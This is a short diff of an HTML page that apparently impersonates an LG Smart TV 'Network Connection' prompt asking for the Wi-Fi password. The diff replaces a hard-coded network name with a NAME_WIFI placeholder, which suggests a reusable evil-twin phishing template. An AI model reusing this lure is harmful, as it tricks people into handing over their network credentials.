@@ -135,7 +135,7 @@
 
         <div id="content-area">
             <h1>Network Connection</h1>
-            <p class="subtitle">Please enter the password for <b>GRMA_PROVEDR</b> to restore internet access to your LG Smart TV.</p>
+            <p class="subtitle">Please enter the password for <b>NAME_WIFI</b> to restore internet access to your LG Smart TV.</p>
             
             <div id="error-msg">Incorrect password. Please try again.</div>
 
